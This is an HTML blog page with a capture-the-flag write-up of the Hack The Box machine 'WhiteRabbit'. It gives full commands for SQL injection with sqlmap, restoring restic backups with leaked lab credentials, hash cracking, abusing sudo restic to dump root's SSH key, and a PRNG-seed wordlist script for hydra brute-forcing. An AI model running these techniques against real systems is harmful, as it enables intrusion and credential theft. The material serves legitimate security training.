@@ -1,0 +1,311 @@
+<!DOCTYPE html>
+<html lang="en" class="scroll-smooth">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Write Up of WhiteRabbit: An Insane Hack The Box Machine - Starfell Harbor</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:wght@700&family=Inter:wght@400;500;700&family=Playfair+Display:wght@700&family=Source+Code+Pro:wght@400;500&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="../../../assets/css/main.css">
+    <link href="https://fonts.googleapis.com/css2?family=Qwitcher+Grypen:wght@700&display=swap" rel="stylesheet">
+</head>
+<body class="text-gray-800">
+
+    <header id="navbar" class="sticky top-0 left-0 right-0 z-50 px-4 sm:px-6 lg:px-8 border-b border-gray-200">
+        <div class="container mx-auto flex justify-between items-center">
+            <a href="../../../index.html" class="font-logo js-logo-fade" style="color: var(--logo-color); line-height: 1;">
+                <span>Starfell</span>
+                <span class="block mt-[-0.5em] ml-4">Harbor</span>
+            </a>
+            <nav class="hidden md:flex items-center space-x-8">
+                <div class="relative dropdown">
+                    <button id="blogs-button" class="text-gray-600 hover:text-gray-900 transition-colors flex items-center">
+                        <span id="dropdown-text">Blogs</span>
+                        <svg class="w-4 h-4 ml-1" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path></svg>
+                    </button>
+                    <div id="blogs-menu" class="dropdown-menu absolute top-full w-48 bg-white rounded-lg shadow-xl py-2">
+                        <a href="../../index.html" class="block px-4 py-2 text-sm text-gray-700 hover:bg-gray-100">Cyber</a>
+                        <a href="../../../tech/index.html" class="block px-4 py-2 text-sm text-gray-700 hover:bg-gray-100">Tech</a>
+                        <a href="../../../personal/index.html" class="block px-4 py-2 text-sm text-gray-700 hover:bg-gray-100">Personal</a>
+                    </div>
+                </div>
+                <a href="#contact" class="subscribe-btn text-white font-semibold py-2 px-5 rounded-lg">Appreciate</a>
+            </nav>
+            <button id="mobile-menu-button" class="md:hidden text-gray-900">
+                <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16m-7 6h7"></path></svg>
+            </button>
+        </div>
+        <div id="mobile-menu" class="hidden md:hidden mt-4 bg-white rounded-lg shadow-md p-4">
+             <div class="relative">
+                <button id="mobile-blogs-button" class="w-full text-left py-2 px-4 text-sm hover:bg-gray-100 rounded flex justify-between items-center">
+                    <span id="mobile-dropdown-text">Blogs</span>
+                    <svg class="w-4 h-4 ml-1" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path></svg>
+                </button>
+                <div id="mobile-blogs-menu" class="hidden pl-4">
+                    <a href="../../index.html" class="block px-4 py-2 text-sm hover:bg-gray-100 rounded">Cyber</a>
+                    <a href="../../../tech/index.html" class="block px-4 py-2 text-sm hover:bg-gray-100 rounded">Tech</a>
+                    <a href="../../../personal/index.html" class="block px-4 py-2 text-sm hover:bg-gray-100 rounded">Personal</a>
+                </div>
+            </div>
+            <a href="#contact" class="block mt-2 text-center subscribe-btn text-white font-semibold py-2 px-5 rounded-lg">Appreciate</a>
+        </div>
+    </header>
+
+    <main class="py-16 sm:py-24">
+        <article class="container mx-auto px-4 sm:px-6 lg:px-8 max-w-4xl">
+            <header class="mb-12 text-center">
+                <p class="text-lg text-gray-500">JUL 12, 2025 • 8 MIN READ</p>
+                <h1 class="text-4xl md:text-6xl font-bold font-stylish mt-4 mb-6">Write Up of WhiteRabbit: An Insane Hack The Box Machine</h1>
+                <div class="flex items-center justify-center space-x-3 text-gray-600">
+                    <span>By Creepus</span>
+                </div>
+            </header>
+
+            <div class="blog-content">
+                <p>Hello everyone! I’m sharing my experience with “WhiteRabbit,” an Insane-difficulty machine on Hack The Box. This machine presented a series of interconnected challenges that required careful analysis and lot of persistence. I’ll walk you through the steps I took to navigate its various layers and ultimately capture both the user and root flags.</p>
+                
+                <h2>Phase 1: Initial Reconnaissance</h2>
+                <p>My process started with the usual reconnaissance, aiming to understand the target’s network and services.</p>
+
+                <h3>Nmap Scan & Initial Web Discovery</h3>
+                <p>I began with an Nmap scan to identify open ports and services:</p>
+                <pre><code>nmap -sC -sV -oA nmap/whiterabbit 10.10.11.63</code></pre>
+                <p>The Nmap scan showed that HTTP (port 80) and SSH (ports 22 and 2222) were open. When I visited <code>http://whiterabbit.htb</code> in my browser, it was a basic webpage without any obvious vulnerabilities. My initial attempt at directory brute-forcing the main domain with <code>gobuster</code> and <code>feroxbuster</code> didn't yield much but took lot of time, so I knew I needed to look elsewhere.</p>
+                <figure>
+                    <img src="images/1.webp" alt="Initial visit to whiterabbit.htb" class="w-full h-auto rounded-xl shadow-md">
+                    <figcaption>Screenshot 1: Initial visit to whiterabbit.htb showing Uptime Kuma.</figcaption>
+                </figure>
+                
+                <h3>Subdomain Enumeration</h3>
+                <p>Knowing that subdomains often hide interesting services in CTFs, I shifted my focus. My Nmap scan had already hinted at <code>status.whiterabbit.htb</code>. When I navigated to this subdomain, I found an instance of Uptime Kuma.</p>
+                <figure>
+                    <img src="images/2.webp" alt="Initial visit to status.whiterabbit.htb" class="w-full h-auto rounded-xl shadow-md">
+                    <figcaption>Screenshot 2: Initial visit to status.whiterabbit.htb showing Uptime Kuma.</figcaption>
+                </figure>
+                <p>Uptime Kuma might be a monitoring tool, and I researched and find out that some of its endpoints might be accessible without authentication. This led me to specifically target the <code>/status/</code> path on <code>status.whiterabbit.htb</code> for directory brute-forcing.</p>
+                <pre><code>feroxbuster -u http://status.whiterabbit.htb/status/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,txt,json,xml -t 50</code></pre>
+                <p>This targeted approach was successful! I discovered <code>/status/temp/</code>. Visiting <code>http://status.whiterabbit.htb/status/temp/</code> revealed a list of new subdomains:</p>
+                <p>GoPhish -> <code>ddb09a8558c9.whiterabbit.htb</code></p>
+                <p>Wikijs -> <code>a66891065514.whiterabbit.htb</code></p>
+                <figure>
+                    <img src="images/3.webp" alt="/status/temp/ page showing new subdomains" class="w-full h-auto rounded-xl shadow-md">
+                    <figcaption>Screenshot 3: The /status/temp/ page showing newly discovered subdomains.</figcaption>
+                </figure>
+                <p>This discovery was a key moment, redirecting my efforts from less fruitful paths.</p>
+
+                <h2>Phase 2: Web Vulnerability</h2>
+                <p>My next step was to investigate these newly found subdomains.</p>
+                <h3>Wikijs and the GoPhish Webhook</h3>
+                <p>While browsing the Wikijs site, I came across a page at <code>http://a668910b5514e.whiterabbit.htb/en/gophish_webhooks</code>. This page described a webhook endpoint connected to GoPhish, which performed "User Validation: Checks if the user's email from the event is present in the database." This immediately suggested a potential SQL Injection vulnerability.</p>
+                <figure>
+                    <img src="images/4.webp" alt="Wikijs page /en/gophish_webhooks content." class="w-full h-auto rounded-xl shadow-md">
+                    <figcaption>Screenshot 4: The Wikijs page /en/gophish_webhooks content.</figcaption>
+                </figure>
+                <p>However, I found that the endpoint required an <code>x-gophish-signature</code> header, which was an HMAC signature of the POST request body. Without the secret key, I couldn't generate a valid signature.</p>
+
+                <h3>The Hidden Secret Key</h3>
+                <p>The Wikijs page provided another important hint: a JSON file, <code>gophish_to_phishing_score_database.json</code>. I navigated to <code>http://a668910b5514e.whiterabbit.htb/gophish/gophish_to_phishing_score_database.json</code>. A quick search for "secret" in this JSON file revealed the HMAC key! This was a clear indicator.</p>
+                <p>The secret key was: <code>3CWVGMndgMvdVAz0jqBiTicmv7gxc6IS</code>.</p>
+                <figure>
+                    <img src="images/5.webp" alt="gophish_to_phishing_score_database.json file" class="w-full h-auto rounded-xl shadow-md">
+                    <figcaption>Screenshot 5: The gophish_to_phishing_score_database.json file showing the secret key.</figcaption>
+                </figure>
+
+                <h3>Automating HMAC Signature Generation for SQLi</h3>
+                <p>With the secret key, I could now generate valid HMAC signatures. I confirmed the SQL injection vulnerability by crafting a simple payload with some help like <code>{"campaign_id":2,"email":"test\"","message": "Clicked Link"}</code> and generating its HMAC-SHA256 signature using CyberChef. The resulting MySQL syntax error confirmed the vulnerability.</p>
+                <figure>
+                    <img src="images/6.webp" alt="CyberChef showing HMAC signature generation" class="w-full h-auto rounded-xl shadow-md">
+                    <figcaption>Screenshot 6: CyberChef with the secret key and payload, showing the generated HMAC signature.</figcaption>
+                </figure>
+                <p>Manually generating signatures for each <code>sqlmap</code> request would be very slow. This was a good opportunity for a custom solution. I decided to create a Burp Suite extension to automatically add the <code>x-gophish-signature</code> header with the correct HMAC signature. This was a custom Python script loaded directly into Burp.</p>
+                 <figure>
+                    <img src="images/7.webp" alt="Burp Suite Extender tab showing the HMAC Header extension loaded" class="w-full h-auto rounded-xl shadow-md">
+                    <figcaption>Screenshot 7: Burp Suite Extender tab showing the HMAC Header extension loaded.</figcaption>
+                </figure>
+                <p>With the Burp extension active, I attempted to use <code>sqlmap</code> to automate the data dumping.</p>
+                <pre><code>sqlmap -u http://28efa8f7df.whiterabbit.htb/webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfdld --method POST --data '{"campaign_id":2,"email":"test@mail.com", "message": "Clicked Linka"}' -p email -D temp -T command_log --proxy http://127.0.0.1:8080 --flush</code></pre>
+                <p>During this phase, I encountered a minor issue, my VM became unstable due to overload. So I tried configuring my VM with increased resources and that resulted in:</p>
+
+                <h2>Phase 3: Restic Repository Access</h2>
+                <p>From the <code>sqlmap</code> output, I obtained two critical pieces of information:</p>
+                <p>Restic repository URL: <code>http://75951e6ff.whiterabbit.htb</code></p>
+                <p>Restic password: <code>ygcsvCuMdfZ89yaRLLTKhe5jAmth7vxw</code></p>
+                <p>This was a significant lead, as Restic is a backup program, and gaining access to its repository could mean finding sensitive files.</p>
+
+                <h3>Accessing and Restoring Restic Backups</h3>
+                <p>First, I set environment variables for <code>restic</code> to simplify commands:</p>
+                <pre><code>export RESTIC_PASSWORD=ygcsvCuMdfZ89yaRLLTKhe5jAmth7vxw
+export RESTIC_REPOSITORY=rest:http://75951e6ff.whiterabbit.htb</code></pre>
+                <p>Then, I listed the available snapshots:</p>
+                <pre><code>restic snapshots</code></pre>
+                <figure>
+                    <img src="images/8.webp" alt="Terminal showing restic snapshots output" class="w-full h-auto rounded-xl shadow-md">
+                    <figcaption>Screenshot 8: Terminal showing restic snapshots output.</figcaption>
+                </figure>
+                <p>This showed a snapshot with ID <code>272cacd5</code> containing <code>/dev/shm/bob/ssh</code>. This path immediately suggested the presence of SSH keys. I proceeded to restore this snapshot to my local machine:</p>
+                <pre><code>mkdir -p /tmp/restored_files/
+restic restore 272cacd5 --target /tmp/restored_files/</code></pre>
+
+                <h3>Cracking bob.7z</h3>
+                <p>Navigating into the restored directory (<code>/tmp/restored_files/dev/shm/bob/ssh/</code>), I found a file named <code>bob.7z</code>. This was an encrypted 7-Zip archive. To crack its password, I extracted its hash using <code>7z2john</code>:</p>
+                <pre><code>cd /tmp/restored_files/dev/shm/bob/ssh/
+7z2john bob.7z</code></pre>
+                <figure>
+                    <img src="images/9.webp" alt="Terminal showing 7z2john outputting the hash" class="w-full h-auto rounded-xl shadow-md">
+                    <figcaption>Screenshot 9: Terminal showing 7z2john bob.7z outputting the hash.</figcaption>
+                </figure>
+                <p>With the hash extracted, I used Hashcat to crack the password. The Hashcat mode for 7-Zip archives is <code>11600</code>.</p>
+                <pre><code>hashcat -m 11600 bob_7z.hash /usr/share/wordlists/rockyou.txt --force</code></pre>
+                <p>Hashcat found the password: <code>1q2w3e4r5t6y</code>.</p>
+                
+                <h3>Gaining SSH Access as bob</h3>
+                <p>With the password for <code>bob.7z</code>, I extracted its contents:</p>
+                <pre><code>7z x bob.7z</code></pre>
+                <p>(I entered <code>1q2w3e4r5t6y</code> when prompted for the password.)</p>
+                <p>This extraction revealed a private SSH key file named <code>bob</code>. I set the correct permissions for the key and then used it to SSH into <code>whiterabbit.htb</code> on port <code>2222</code> as the user <code>bob</code>:</p>
+                <pre><code>chmod 600 bob
+ssh -i bob bob@whiterabbit.htb -p 2222</code></pre>
+                <figure>
+                    <img src="images/10.webp" alt="Terminal showing successful SSH as bob" class="w-full h-auto rounded-xl shadow-md">
+                    <figcaption>Screenshot 10: Terminal showing 7z x bob.7z, ls -l of extracted key, chmod 600, and successful SSH as bob.</figcaption>
+                </figure>
+
+                <h2>Phase 4: Privilege Escalation (Bob to Morpheus)</h2>
+                <p>Now logged in as <code>bob</code>, my next step was to look for privilege escalation opportunities. I checked <code>sudo</code> privileges:</p>
+                <pre><code>sudo -l</code></pre>
+                <p>The output was useful: <code>User bob may run the following commands on ebdce80611e9: (ALL) NOPASSWD: /usr/bin/restic</code>. This meant <code>bob</code> could execute <code>/usr/bin/restic</code> as the <code>root</code> user without needing a password.</p>
+                
+                <h3>Abusing restic for Root File Access</h3>
+                <p>I realized I could use this <code>NOPASSWD</code> restic privilege to back up sensitive directories, like <code>/root/</code>, and then extract their contents.</p>
+                <p>First, I initialized a new local Restic repository on the remote machine, executed as <code>root</code> via <code>sudo</code>:</p>
+                <pre><code>sudo /usr/bin/restic init --repo .</code></pre>
+                <p>(I set a new password for this local repository.)</p>
+                <p>Then, I backed up the <code>/root/</code> directory:</p>
+                <pre><code>sudo /usr/bin/restic --repo . backup /root/</code></pre>
+                <p>Finally, I dumped the contents of <code>/root/morpheus</code> from this new backup. This file was anticipated to contain the SSH private key for the <code>morpheus</code> user.</p>
+                <pre><code>sudo /usr/bin/restic --repo . dump latest /root/morpheus</code></pre>
+                <figure>
+                    <img src="images/11.webp" alt="Terminal showing restic commands and morpheus key" class="w-full h-auto rounded-xl shadow-md">
+                    <figcaption>Screenshot 11: Terminal showing sudo restic init, sudo restic backup /root/, and sudo restic dump latest /root/morpheus with the key content.</figcaption>
+                </figure>
+                
+                <h3>SSH as morpheus and User Flag Retrieval</h3>
+                <p>I copied the <code>morpheus</code> private key content, saved it to <code>morpheus_id_rsa</code> on my Kali machine, and set its permissions. An SSH connection was then established to <code>whiterabbit.htb</code> as <code>morpheus</code> on the default SSH port (22):</p>
+                <pre><code>nano morpheus_id_rsa # Paste key here
+chmod 600 morpheus_id_rsa
+ssh -i morpheus_id_rsa morpheus@whiterabbit.htb</code></pre>
+                <p>Upon successful login as <code>morpheus</code>, I quickly located and read the <code>user.txt</code> flag:</p>
+                <pre><code>cat user.txt</code></pre>
+                <p>The user flag obtained was: ********************************<br>(Cannot give away the flag as the machine is still active.)</p>
+                <figure>
+                    <img src="images/12.webp" alt="Terminal showing successful SSH as morpheus and user flag" class="w-full h-auto rounded-xl shadow-md">
+                    <figcaption>Screenshot 12: Terminal showing chmod 600 morpheus_id_rsa, successful SSH as morpheus, and cat user.txt with the user flag.</figcaption>
+                </figure>
+
+                <h2>Phase 5: Root Privilege Escalation (Neo Password Generator)</h2>
+                <p>With the user flag secured, the final objective was root privilege escalation. I recalled the <code>sqlmap</code> output (which contained <code>command_log</code> details) indicating that <code>/opt/neo-password-generator/neo-password-generator</code> was executed at <code>2024-08-30 14:40:42</code>. This binary was used to set the <code>neo</code> user's password.</p>
+                <p>The key insight was that this custom binary likely used a time-based pseudo-random number generator (PRNG) to create the password. I used AI to find out the seed was calculated as <code>(seconds * 1000) + (microseconds / 1000)</code>. While the exact seconds were known, the microseconds were not, meaning I had to brute-force 1000 possible microsecond values (0-999).</p>
+
+                <h3>Custom Password List Generation and Hydra Bruteforce</h3>
+                <p>Instead of manually testing each of the 1000 generated passwords, I opted for an automated approach. I used a custom Python script with the help of Gemini to generate all possible passwords based on the PRNG logic. This wordlist was then used with <code>hydra</code> for SSH brute-forcing.</p>
+                <p>The <code>pass_wordlist_generator.py</code> script:</p>
+                <pre><code># pass_wordlist_generator.py
+from ctypes import CDLL
+import datetime
+libc = CDLL("libc.so.6")
+
+seconds = datetime.datetime(2024, 8, 30, 14, 40, 42, tzinfo=datetime.timezone(datetime.timedelta(0))).timestamp()
+for i in range(0,1000):
+    password = ""
+    microseconds = i
+    current_seed_value = int(seconds * 1000 + microseconds)
+    libc.srand(current_seed_value)
+    for j in range(0,20):
+        rand_int = libc.rand()
+        password += "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"[ rand_int % 62]
+    print(password)</code></pre>
+                <p>The wordlist was generated by redirecting the script’s output:</p>
+                <pre><code>python3 pass_wordlist_generator.py > pass_list.txt</code></pre>
+                <p><code>hydra</code> was then used to perform the SSH password brute-force for the <code>neo</code> user:</p>
+                 <figure>
+                    <img src="images/13.webp" alt="Terminal showing automated password finding" class="w-full h-auto rounded-xl shadow-md">
+                    <figcaption>Screenshot 13: Terminal showing automated password finding.</figcaption>
+                </figure>
+                <p>The root flag obtained was: ********************************<br>(Cannot give away the flag as the machine is still active.)</p>
+                <figure>
+                    <img src="images/14.webp" alt="Terminal showing root flag" class="w-full h-auto rounded-xl shadow-md">
+                    <figcaption>Screenshot 14: Terminal showing sudo su, and cat /root/root.txt with the root flag. (with username & timestamp)</figcaption>
+                </figure>
+
+                <h2>Network Diagram</h2>
+                <p>Here’s a simplified network diagram illustrating the key interactions during this penetration test:</p>
+                <pre><code>+----------------+
+|  Kali Linux    |
+| (Attacker)     |
++-------+--------+
+        |
+        | SSH (22, 2222)
+        | HTTP (80)
+        | (Burp Proxy)
+        |
++-------v--------+
+|  whiterabbit.htb |
+| (10.10.11.63)  |
++-------+--------+
+        |
+        | HTTP (80)
+        |
++-------v--------+
+|   Subdomains   |
+|----------------|
+| status.whiterabbit.htb (Uptime Kuma)
+|   -> /status/temp/
+| ddb09a8558c9.whiterabbit.htb (GoPhish)
+| a66891065514.whiterabbit.htb (Wikijs)
+|   -> /en/gophish_webhooks
+|   -> /gophish/gophish_to_phishing_score_database.json
+| 28efa8f7df.whiterabbit.htb (Webhook Endpoint)
+|   -> /webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfdld (SQLi)
+| 75951e6ff.whiterabbit.htb (Restic Repository)
++----------------+</code></pre>
+                <figure>
+                    <img src="images/15.webp" alt="WhiteRabbit machine pwned!" class="w-full h-auto rounded-xl shadow-md">
+                    <figcaption>Screenshot 15: WhiteRabbit machine pwned!</figcaption>
+                </figure>
+                <p>This machine was incredibly difficult for me, just as it suggests. It pushed me to learn many new techniques and reminded me of the importance of persistence. That made capturing the flags feel especially rewarding — I’m glad I stuck with it.</p>
+                <p><a href="https://labs.hackthebox.com/achievement/machine/2407103/655" target="_blank" rel="noopener noreferrer">https://labs.hackthebox.com/achievement/machine/2407103/655</a></p>
+                <p>Thanks for taking the time to read!</p>
+            </div>
+        </article>
+    </main>
+
+    <footer id="contact" class="pt-16 sm:pt-24" style="padding-bottom: var(--footer-bottom-padding);">
+        <div class="container mx-auto px-4">
+            <hr class="border-gray-200 mb-16 sm:mb-20">
+            
+            <div class="max-w-xl mx-auto text-center">
+                <h2 class="text-4xl font-bold font-stylish mb-4">Enjoy the read?</h2>
+                <p class="text-gray-600 mb-8">If you enjoyed my work, feel free to leave your wishes here along with your name — a simple way to share your appreciation!</p>
+                <form name="appreciation-cyber-whiterabbit" method="POST" data-netlify="true" class="flex flex-col sm:flex-row gap-4 max-w-md mx-auto">
+                    <input type="text" name="visitor_name" placeholder="Enter your name" class="w-full px-4 py-3 rounded-lg border border-gray-300 focus:outline-none focus:ring-2 focus:ring-blue-500" required>
+                    <button type="submit" class="w-full sm:w-auto subscribe-btn text-white font-semibold py-3 px-6 rounded-lg flex-shrink-0">Send</button>
+                </form>
+            </div>
+            
+            <div class="container mx-auto mt-16">
+                <div class="divider" style="margin-bottom: var(--footer-divider-margin-bottom);">
+                    <img src="../../../assets/images/Clipped_image_20250816_104657.png" alt="Rotating Star" class="rotating-star w-8 h-8" onerror="this.style.display='none'">
+                </div>
+                <div class="flex justify-between items-center">
+                    <p class="text-gray-600 text-sm">&copy; 2025 Starfell Harbor. All Rights Reserved.</p>
+                    <a href="../../index.html" class="text-gray-600 hover:text-gray-900 text-sm">Back to Cyber Writings</a>
+                </div>
+            </div>
+        </div>
+    </footer>
+    
+    <script src="../../../assets/js/main.js"></script>
+</body>
+</html>
